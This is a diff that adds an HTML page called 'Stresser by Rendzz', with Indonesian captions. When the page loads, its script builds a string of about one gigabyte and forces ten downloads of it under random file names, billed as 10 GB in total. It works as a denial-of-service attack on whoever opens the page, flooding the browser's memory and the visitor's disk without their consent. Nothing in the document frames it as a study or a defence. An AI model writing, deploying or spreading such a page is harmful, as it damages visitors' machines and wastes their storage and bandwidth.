@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Stresser by Rendzz - GB Version</title>
+    <style>
+        body {
+            background-color: black;
+            color: lime;
+            font-family: monospace;
+            text-align: center;
+            padding: 50px;
+        }
+        h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Stresser by Rendzz</h1>
+    <p>Mendownload file besar (1-2 GB) secara otomatis!</p>
+
+    <script>
+        function generateRandomString(length) {
+            const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            let result = "";
+            for (let i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return result;
+        }
+
+        function downloadFile(filename, content) {
+            const element = document.createElement("a");
+            const blob = new Blob([content], { type: "text/plain" });
+            const url = URL.createObjectURL(blob);
+            element.setAttribute("href", url);
+            element.setAttribute("download", filename);
+            document.body.appendChild(element);
+            element.click();
+            document.body.removeChild(element);
+            URL.revokeObjectURL(url);
+        }
+
+        // Ukuran file sekitar 1 GB
+        const largeContent = "Stresser by Rendzz! ".repeat(50 * 1024 * 1024); // 1 GB
+        for (let i = 0; i < 10; i++) { // Download 10 file (total 10 GB)
+            const randomName = "Rendzz_Giga_" + generateRandomString(5) + ".txt";
+            downloadFile(randomName, largeContent);
+        }
+    </script>
+</body>
+</html>
